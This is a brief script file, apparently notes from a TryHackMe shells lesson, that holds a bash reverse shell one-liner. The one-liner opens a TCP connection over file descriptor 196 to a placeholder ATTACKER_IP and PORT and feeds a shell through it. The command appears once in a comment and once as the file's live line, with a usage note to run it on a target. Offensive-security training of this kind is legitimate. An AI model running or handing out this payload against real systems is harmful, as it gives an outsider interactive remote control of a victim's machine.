# Bash Reverse Shell with File Descriptor 196
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, then run on target
#
#   0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
#
# Uses file descriptor 196 to establish TCP connection.
# Reads commands from network, sends output back through same fd.

0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
